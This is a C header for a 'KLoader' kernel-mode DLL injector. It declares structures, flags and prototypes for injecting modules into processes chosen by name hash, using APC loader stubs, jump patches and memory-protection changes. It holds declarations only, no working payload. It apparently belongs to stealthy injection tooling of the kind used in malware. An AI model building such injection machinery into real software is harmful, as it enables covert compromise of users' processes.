//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KLoader project Version 2.9.2
//	
// module: kloader.h
// $Revision: 80 $
// $Date: 2012-07-11 18:01:22 +0400 (Ср, 11 июл 2012) $
// description:
//	Kernel-mode loader for user DLL images.

#pragma once

typedef NTSTATUS (_stdcall* FUNC_LOAD_LIBRARY)	(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle); 
typedef NTSTATUS (_stdcall* FUNC_PROC_ADDRESS)	(PVOID ModuleHandle, PANSI_STRING FunctionName, WORD Oridinal, PVOID* FunctionAddress);
typedef NTSTATUS (_stdcall* FUNC_PROTECT_MEM)	(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR* ProtectSize, ULONG NewProtect, PULONG OldProtect);	
typedef ULONG	 (_stdcall* FUNC_DLL_MAIN)		(PVOID hinstDLL, DWORD fdwReason, PVOID lpvReserved);
typedef BOOL	 (_stdcall* FUNC_CREATE_PROCESS)(PWSTR lpApplicationName, PWSTR lpCommandLine, PVOID lpProcessAttributes,
					PVOID lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, PVOID lpEnvironment,
					PWSTR lpCurrentDirectory, PSTARTUPINFOW lpStartupInfo, PPROCESS_INFORMATION lpProcessInformation);

typedef ULONG	(_stdcall* FUNC_APP_ENTRY) (PVOID Context);
typedef VOID	(_stdcall* FUNC_IOP_CLOSE_FILE)(PEPROCESS Process, PVOID Object, ULONG GrantedAccess, ULONG_PTR ProcessHandleCount, ULONG_PTR SystemHandleCount);
typedef HANDLE	(_stdcall* FUNC_CREATE_THREAD)(PVOID lpThreadAttributes, SIZE_T dwStackSize, PVOID lpStartAddress, 
					PVOID lpParameter, DWORD dwCreationFlags, PULONG lpThreadId);

typedef VOID	(_stdcall* EXPORTED_FUNCTION)(PVOID Param0, PVOID Param1, PVOID Param2);

// Module description structured
typedef	struct	_INJECT_DESCRIPTOR
{
#if _DBG
	ULONG				Magic;
#endif

	LIST_ENTRY			InjectListEntry;		
	LIST_ENTRY			ProcessListEntry;

	PUNICODE_STRING		InjectModulePath;
	PVOID				InjectModuleBuffer;
	PVOID				NtdllBase;
	ULONG				Flags;
	ULONG				TargetProcessHash;
	ULONG				InjectModuleId;
	LONG volatile		ReferenceCount;
	LONG volatile		AttachCount;
} INJECT_DESCRIPTOR, *PINJECT_DESCRIPTOR;

#define		LOADER_STUB_MAX		0x800		// bytes
#define		LOADER_PATH_MAX		0x200		// bytes

typedef struct	_PROCESS_IMPORT
{
	ULONGLONG	pLdrLoadDll;
	ULONGLONG	pLdrGetProcedureAddress;
	ULONGLONG	pNtProtectVirtualMemory;
	ULONGLONG	pZwProtectVirtualMemory;
	ULONGLONG	pCreateThread;
} PROCESS_IMPORT, *PPROCESS_IMPORT;


// Loader stub context
typedef struct	_LOADER_CONTEXT
{
	PROCESS_IMPORT		Import;
	UCHAR				LoaderStub[LOADER_STUB_MAX];
	UCHAR				ExportStub[LOADER_PATH_MAX];
	ULONG				PatchProtect;
	ULONG				Flags;
	ULONGLONG			ImageBase;
	ULONGLONG			PatchBase;
	ULONGLONG			PatchSize;

	ULONGLONG			ExportedFunction;

	UNICODE_STRING		uDllPath;
	WCHAR				wDllPath[0];
} LOADER_CONTEXT, *PLOADER_CONTEXT;

#define		MAX_INJECTS_PER_PROCESS		4

// Inject context
typedef	struct	_INJECT_CONTEXT
{
	PINJECT_DESCRIPTOR	InjDesc;
	PLOADER_CONTEXT		LdrCtx;
	PVOID				ApcRoutine;
	PVOID				ApcContext;
	PVOID				ModuleBase;
	ULONG				Flags;
} INJECT_CONTEXT, *PINJECT_CONTEXT;


// Active process context
typedef struct	_PID_CONTEXT
{
	ULONG				InjectCount;
	ULONG				Flags;
	INJECT_CONTEXT		InjectContext[MAX_INJECTS_PER_PROCESS];
	PROCESS_IMPORT		Import;
} PID_CONTEXT, *PPID_CONTEXT;

#define		PID_IS_LOADER				0x100000		
#define		PID_HAS_IMPORT				0x200000

// Inject descriptor flags
#define		INJECT_SPECIFIED_PROCESS	1
#define		INJECT_WOW64_PROCESS		4
#define		INJECT_AMD64_PROCESS		8
#define		INJECT_SPECIFIED_MODULE		0x10
#define		INJECT_PROCESS_TREE			0x20
#define		INJECT_STATE_WAITING_APC	0x100
#define		INJECT_STATE_INJECTED		0x200
#define		INJECT_KERNEL_LOADED		0x1000
#define		INJECT_WOW64_LOADED			0x2000


#define			INJECT_DESCRIPTOR_MAGIC		'DjnI'
#if _DBG
	#define		TAG_INJECT_DESCRIPTOR		INJECT_DESCRIPTOR_MAGIC
	#define		TAG_KLOADER_POOL			'rdLK'

	#define		ASSERT_INJECT_DESCRIPTOR(x)	ASSERT((x)->Magic == INJECT_DESCRIPTOR_MAGIC)
#else
	#define		TAG_INJECT_DESCRIPTOR	0
	#define		TAG_KLOADER_POOL		0

	#define		ASSERT_INJECT_DESCRIPTOR(x)
#endif

#pragma pack(push)
#pragma pack(1)
typedef struct _JMP_STUB
{
	UCHAR	PushOpcode;
	ULONG	PushValue;
	UCHAR	CallOpcode;
	ULONG	CallOffset;
} JMP_STUB, *PJMP_STUB;

typedef struct _JMP_STUB64
{
	USHORT		Opcode;
	ULONG		Offset;
	ULONG_PTR	Address;
} JMP_STUB64, *PJMP_STUB64;
#pragma pack(pop)

#define		OPCODE_JMP_NEAR		0xE9
#define		OPCODE_CALL_NEAR	0xE8
#define		OPCODE_PUSH_DWORD	0x68

#define		ATTACH_COUNT_MAX	(ULONG)-1


UCHAR	LoadDllApcStubWow64[];
UCHAR	CallExportStubWow64[];

PINJECT_DESCRIPTOR	AllocateInjectDescriptor(ULONG ProcessHash, ULONG ModuleId, PVOID Module, ULONG AttachCount, ULONG Flags);
VOID				InsertInjectDescriptor(PINJECT_DESCRIPTOR	InjDesc);
VOID	_stdcall	LoadDllApcStub(PLOADER_CONTEXT LdrCtx,	PVOID SystemArgument1, PVOID SystemArgument2);
ULONG	_stdcall	CallExportStub(PLOADER_CONTEXT LdrCtx);


#pragma intrinsic(_disable)
#pragma intrinsic(_enable)


//---- KLoader API ------------------------------------------------------------------------------------------------------------


NTSTATUS KldrLoadInjectConfig(VOID);
NTSTATUS KldrAddInject(PCHAR VfsDllName, PCHAR ProcessList, PCHAR pImageBuffer,	ULONG ImageSize, ULONG Flags, ULONG AttachCount);
NTSTATUS KldrAddInjectConfig(PCHAR InjectStr);
ULONG	KldrRemoveInject(PCHAR InjectModuleName, ULONG ProcessNameHash);

// from callback.c
NTSTATUS KldrRegisterUserNotifyCallback(PVOID pCallbackFunction, PVOID Context, HANDLE ProcessId, BOOL bSet);
VOID	KldrUserNotifyCreateProcess(HANDLE ProcessId, HANDLE ParentId);